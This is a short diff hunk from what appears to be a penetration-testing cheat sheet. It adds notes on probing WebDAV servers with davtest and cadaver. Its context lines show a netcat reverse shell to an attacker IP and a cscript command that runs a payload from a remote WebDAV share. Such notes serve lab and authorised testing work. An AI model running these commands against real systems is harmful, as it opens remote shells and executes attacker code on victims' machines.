@@ -242,6 +242,11 @@ nc.exe <attacker_ip> 1234 -e cmd.exe
 ### Downloading
 
 ```
+Quick way to test webdav for execution:
+davtest -url http://192.168.1.209
+
+Also use cadaver then open $ip to access WebDav on cli
+
 # Execute file from a WebDav server:
 cscript //E:jscript \\IP\folder\payload.txt
 
